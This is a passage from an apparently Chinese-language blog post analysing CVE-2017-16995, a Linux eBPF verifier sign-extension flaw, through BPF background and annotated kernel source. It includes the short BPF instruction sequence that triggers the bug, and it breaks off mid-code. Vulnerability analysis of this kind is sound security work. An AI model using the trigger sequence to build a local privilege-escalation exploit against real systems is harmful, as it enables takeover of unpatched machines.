<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2017-16995 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2017-16995</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018/07/16</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Linux_Kernel"> Linux_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><ul>
<li>实验环境：ubuntu 16.4</li>
<li>漏洞类型：有无符号数比较导致整数扩展漏洞</li>
<li>linux补丁：<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f</a></li>
<li>漏洞描述：在linux内核源码kernel/bpf/verifier.c中的check_alu_op函数允许本地用户通过构造不正确的符号导致一些意料之外的影响。</li>
<li>相关模块：bpf模块</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="BPF简介"><a href="#BPF简介" class="headerlink" title="BPF简介"></a>BPF简介</h4><p>BPF(Berkeley Packet Filter)该机制最开始用来对数据包做过滤用的，一般用在对套接字做过滤的实现上，通过把写好的规则与指定的套接字做绑定(setsockopt)从而达到控制某些类型的数据是否通过目标socket的功能。本质上BPF其实是一种内核<code>代码注入技术</code>。在内核中实现了一eBPF虚拟机，通过在用户空间生成BPF目标码然后通过BPF接口把目标代码注入到内核中去，内核通过JIT(Jus-In-Time)将BPF目标编码转换为本地指令，当需要进行过滤的时候内核就会通过钩子函数来首先运行这些BPF代码。该机制的好处就在于能够在不修改内核代码的前提下修改内核处理某些数据的策略。<br>既然提供了代码注入功能，那么该机制的安全问题就是重点，BPF提供了很多规则来限制用户态传入的BPF代码。确保被注入的代码都是属于合规代码。下面列出几个我们比较关注的限制规则。</p>
<ul>
<li>一个BPF的代码不能超过BPF_MAXINSNS(4K),运行总步数不能超过32K(4.9改为了96K)</li>
<li>禁止代码存在循环操作，代码可能的总分支也被限制不能超过1K</li>
<li>限制不能访问全局变量，只能访问局部变量，如果需要访问全局变量则只能访问BPF map对象，该map对象是同时被用户态，BPF代码，内核态共同访问到。</li>
</ul>
<p>对BPF代码的安全规则检查主要在BPF代码加载时，通过BPF verifier来实现。大致分为两步：</p>
<ul>
<li>1.通过DAG(Directed Acyclic Graph有向无环图)的DFS(Depth-first Search)深度优先算法来遍历BPF程序的代码路径，确保无环路发生。</li>
<li>2.逐条检查BPF指令对register和对stack的影响，确保不存在各种越界读写等违规操作。</li>
</ul>
<h4 id="BPF系统调用"><a href="#BPF系统调用" class="headerlink" title="BPF系统调用"></a>BPF系统调用</h4><p>我们来看下如何使用bpf机制，在内核中对外提供了一个系统调用bpf，通过传入不同参数分派不同函数去完成需要的功能。下面列一下本次相关的几个参数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></div><div class="line">　　　　<span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</div></pre></td></tr></table></figure></p>
<p>几个相关的CMD选项：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BPF_MAP_CREATE：(map_create(&amp;attr);        <span class="comment">/* BPF_MAP_CREATE创建映射表 */</span>)</div><div class="line">BPF_MAP_LOOKUP_ELEM：(map_lookup_elem(&amp;attr);   <span class="comment">/* BPF_MAP_LOOKUP_ELEM命令用于查找条目 */</span>)</div><div class="line">BPF_MAP_UPDATE_ELEM：(map_update_elem(&amp;attr);   <span class="comment">/* BPF_MAP_UPDATE_ELEM 命令用于向映射表中存储一个条目 value域是要存储的数据的指针 */</span>)</div><div class="line">BPF_PROG_LOAD：(bpf_prog_load(&amp;attr);     <span class="comment">/* 加载到内核,检验安全性,JIT编译,分配句柄fd */</span>)</div></pre></td></tr></table></figure></p>
<p>注意：BPF虚拟指令存在11个虚拟寄存器，其中包括R0~R10，该寄存器与我们硬件CPU的物理寄存器所对应<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">R0 -- RAX（默认函数返回值寄存器）</div><div class="line">R1 -- RDI（R1 ~ R5 一般用来表示内核预设函数的参数）</div><div class="line">R2 -- RSI</div><div class="line">R3 -- RDX</div><div class="line">R4 -- RCX</div><div class="line">R5 -- R8</div><div class="line">R6 -- RBX（R6 ~ R9 在BPF代码中可以作存储用,其值不受内核预设函数影响）</div><div class="line">R7 -- R13</div><div class="line">R8 -- R14</div><div class="line">R9 -- R15</div><div class="line">R10 -- RBP(栈帧指针)</div></pre></td></tr></table></figure></p>
<p>最后再简单了解一下ebpf的指令格式：<br>在eBPF中，每条指令就是一个struct bpf_insn结构体,大小为8字节(1个字节8位共64位)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[0-7]位代表操作码，</div><div class="line">[8-11]位代表目标寄存器，</div><div class="line">[12-15]位代表源寄存器，</div><div class="line">[16-31]为代表操作的偏移值，</div><div class="line">[32-63]位代表操作的立即数。</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* \linux-4.4.1\include\uapi\linux\bpf.h */</span></div><div class="line"><span class="keyword">struct</span> bpf_insn&#123;</div><div class="line">    __u8 code;             <span class="comment">/* opcode */</span></div><div class="line">    __u8 dst_reg:<span class="number">4</span>;        <span class="comment">/* dest register */</span></div><div class="line">    __u8 src_reg:<span class="number">4</span>;        <span class="comment">/* source register */</span></div><div class="line">    __s16 off;             <span class="comment">/* signed offset */</span></div><div class="line">    __s32 imm;             <span class="comment">/* signed immediate constant */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里举个栗子：比如说需要一个类似于令mov eax，0xffffffff的指令，则BPF指令如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST,IMM)         \</span></div><div class="line">    ((struct bpf_insn)&#123;                \</div><div class="line">        .code = BPF_ALU|BPF_MOV|BPF_K, \  <span class="comment">/* BPF_X代表寄存器，BPF_K代表立即数 */</span></div><div class="line">        .dst_reg = DST,                \</div><div class="line">        .src_reg = <span class="number">0</span>,                  \</div><div class="line">        .off = <span class="number">0</span>,                      \</div><div class="line">        .imm = IMM &#125;)</div><div class="line">opcode:\xb4\x09\x00\x00\xff\xff\xff\xff</div><div class="line">eBPF虚拟指令系统隶属于RISC（精简指令集），也就是每条指令的大小一致。</div></pre></td></tr></table></figure></p>
<h3 id="漏洞功能"><a href="#漏洞功能" class="headerlink" title="漏洞功能"></a>漏洞功能</h3><p>在linux内核源码kernel/bpf/verifier.c中的check_alu_op函数未对64位和32位的有符号数分开处理，导致本地用户可通过精心构造不正确的数据导致一些意料之外的影响。<br>由于存在该漏洞导致对以下指令进行解析时模拟执行与实际执行的语义不一致，促使实际执行的指令并没有被检查到。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BPF_MOV32_IMM(BPF_REG_2, <span class="number">0xFFFFFFFF</span>),               <span class="comment">/* r2 = (u32)0xFFFFFFFF   */</span>   \</div><div class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_2, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),     <span class="comment">/* if (r2 == -1) &#123;        */</span>   \</div><div class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                        <span class="comment">/*   exit(0);             */</span>   \</div><div class="line">BPF_EXIT_INSN()                                     <span class="comment">/* &#125;                      */</span>   \</div></pre></td></tr></table></figure></p>
<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>首先我们来看检查时的模拟执行是怎么解释这段代码的，当我们调用系统调用__NR_bpf并且cmd为BPF_PROG_LOAD时，就会将attr结构体中的insns成员指向的bpf指令传入到内核，内核会调用do_check函数对传入的指令做安全检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line">调用链: SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size) ---&gt; bpf_prog_load(&amp;attr) ---&gt; bpf_check(&amp;prog,attr) ---&gt; do_check(env)</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check</span><span class="params">(<span class="keyword">struct</span> verifier_env *env)</span></span>&#123;</div><div class="line">    <span class="keyword">struct</span> verifier_state *state = &amp;env-&gt;cur_state;</div><div class="line">    <span class="keyword">struct</span> bpf_insn *insns = env-&gt;prog-&gt;insnsi;</div><div class="line">    <span class="keyword">struct</span> reg_state *regs = state-&gt;regs;</div><div class="line">    <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</div><div class="line">    <span class="keyword">int</span> insn_idx, prev_insn_idx = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> insn_processed = <span class="number">0</span>;</div><div class="line">    <span class="keyword">bool</span> do_print_state = <span class="literal">false</span>;</div><div class="line">    init_reg_state(regs);</div><div class="line">    insn_idx = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;) &#123;                                <span class="comment">/* 一个大循环,解析用户态传入的每条指令 */</span></div><div class="line">        <span class="keyword">struct</span> bpf_insn *insn;                <span class="comment">/* 指令结构体指针 */</span></div><div class="line">        u8 <span class="keyword">class</span>;</div><div class="line">        <span class="keyword">int</span> err;</div><div class="line">        <span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;           <span class="comment">/* 如果循环计数insn_idx大于或等于bpf程序的长度 就退出 */</span></div><div class="line">            verbose(<span class="string">"invalid insn idx %d insn_cnt %d\n"</span>,insn_idx, insn_cnt);</div><div class="line">            <span class="keyword">return</span> -EFAULT;</div><div class="line">        &#125;</div><div class="line">        insn = &amp;insns[insn_idx];              <span class="comment">/* 遍历每条bpf指令 */</span></div><div class="line">        <span class="keyword">class</span> = BPF_CLASS(insn-&gt;code);        <span class="comment">/* 获取该条指令的class */</span></div><div class="line">        <span class="keyword">if</span> (++insn_processed &gt; <span class="number">32768</span>) &#123;       <span class="comment">/* 判断解析指令条数是否大于 32768 */</span></div><div class="line">            verbose(<span class="string">"BPF program is too large. Proccessed %d insn\n"</span>,insn_processed);</div><div class="line">            <span class="keyword">return</span> -E2BIG;</div><div class="line">        &#125;</div><div class="line">        err = is_state_visited(env, insn_idx);</div><div class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">        <span class="keyword">if</span> (err == <span class="number">1</span>) &#123;</div><div class="line">            <span class="comment">/* found equivalent state, can prune the search */</span></div><div class="line">            <span class="keyword">if</span> (log_level) &#123;</div><div class="line">                <span class="keyword">if</span> (do_print_state)</div><div class="line">                    verbose(<span class="string">"\nfrom %d to %d: safe\n"</span>,prev_insn_idx, insn_idx);</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    verbose(<span class="string">"%d: safe\n"</span>, insn_idx);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">goto</span> process_bpf_exit;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (log_level &amp;&amp; do_print_state) &#123;</div><div class="line">            verbose(<span class="string">"\nfrom %d to %d:"</span>, prev_insn_idx, insn_idx);</div><div class="line">            print_verifier_state(env);</div><div class="line">            do_print_state = <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (log_level) &#123;</div><div class="line">            verbose(<span class="string">"%d: "</span>, insn_idx);</div><div class="line">            print_bpf_insn(insn);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* 开始解析opcode的class部分 判断指令是否等于 BPF_ALU || BPF_ALU64*/</span></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ALU || <span class="keyword">class</span> == BPF_ALU64) &#123;</div><div class="line">            err = check_alu_op(env, insn);</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                <span class="keyword">return</span> err;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_LDX) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_STX) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ST) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_JMP) &#123;</div><div class="line">            u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">            <span class="keyword">if</span> (opcode == BPF_CALL) &#123; </div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;off != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_CALL uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                err = check_call(env, insn-&gt;imm);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_JA uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                insn_idx += insn-&gt;off + <span class="number">1</span>;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</div><div class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">                    insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</div><div class="line">                    [...]</div><div class="line">                &#125;</div><div class="line">process_bpf_exit:</div><div class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);   <span class="comment">/* 弹出保存在临时栈中的分支 */</span></div><div class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    do_print_state = <span class="literal">true</span>;</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                err = check_cond_jmp_op(env, insn, &amp;insn_idx);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">class</span> == BPF_LD) &#123;</div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            verbose(<span class="string">"unknown insn class %d\n"</span>, <span class="keyword">class</span>);</div><div class="line">            <span class="keyword">return</span> -EINVAL;</div><div class="line">        &#125;</div><div class="line">        insn_idx++;                                          <span class="comment">/* 循环计数 */</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>我们主要关注2个class,分别是BPF_ALU与BPF_JMP<br>先看BPF_ALU,实际逻辑在check_alu_op函数中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">class</span> == BPF_ALU || <span class="keyword">class</span> == BPF_ALU64) &#123;</div><div class="line">    err = check_alu_op(env, insn);</div><div class="line">    <span class="keyword">if</span> (err)</div><div class="line">        <span class="keyword">return</span> err;</div><div class="line"><span class="comment">/* check validity of 32-bit and 64-bit arithmetic operations */</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_alu_op</span><span class="params">(<span class="keyword">struct</span> verifier_env *env, <span class="keyword">struct</span> bpf_insn *insn)</span></span>&#123;</div><div class="line">    <span class="keyword">struct</span> reg_state *regs = env-&gt;cur_state.regs;</div><div class="line">    u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">    <span class="keyword">int</span> err;</div><div class="line">    <span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</div><div class="line">        [...]</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;                          <span class="comment">/* opcode == BPF_MOV */</span></div><div class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;                  <span class="comment">/* 判断源寄存器是否存在 跳过*/</span></div><div class="line">           [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;                                             <span class="comment">/* 因为我们MOV使用的立即数,所以进入 */</span></div><div class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</div><div class="line">                verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</div><div class="line">                <span class="keyword">return</span> -EINVAL;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* check dest operand */</span></div><div class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</div><div class="line">        <span class="keyword">if</span> (err)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;                 <span class="comment">/* 判断源寄存器是否存在 跳过*/</span></div><div class="line">            [...]</div><div class="line">        &#125; <span class="keyword">else</span> &#123;                                            <span class="comment">/* 立即数,进入 */</span></div><div class="line">            <span class="comment">/* case: R = imm</span></div><div class="line">             * remember the value we stored into this reg</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;           <span class="comment">/* CONST_IMM = 8 */</span></div><div class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;            <span class="comment">/* insn-&gt;imm:0xffffffff 对regs[insn-&gt;dst_reg].imm进行赋值,注意这里的regs[insn-&gt;dst_reg].imm与insn-&gt;imm都是有符号32位*/</span></div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</div><div class="line">        [...]</div><div class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></div><div class="line">        [...]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过BPF_OP获取指令的opcode,这条指令的opcode是MOV,并且使用的是BPF_K,也就是立即数,所以最终把CONST_IMM赋值给regs[insn-&gt;dst_reg].type,把insn-&gt;imm(0xffffffff)赋值给regs[insn-&gt;dst_reg].imm,<br><code>注意:</code>这里需要留意的一点是insn-&gt;imm和regs[insn-&gt;dst_reg].imm都属于有符号32位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> bpf_insn&#123;</div><div class="line">    __u8 code;             <span class="comment">/* opcode */</span></div><div class="line">    __u8 dst_reg:<span class="number">4</span>;        <span class="comment">/* dest register */</span></div><div class="line">    __u8 src_reg:<span class="number">4</span>;        <span class="comment">/* source register */</span></div><div class="line">    __s16 off;             <span class="comment">/* signed offset */</span></div><div class="line">    __s32 imm;             <span class="comment">/* signed immediate constant */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> reg_state &#123;</div><div class="line">    <span class="keyword">enum</span> bpf_reg_type type;</div><div class="line">    <span 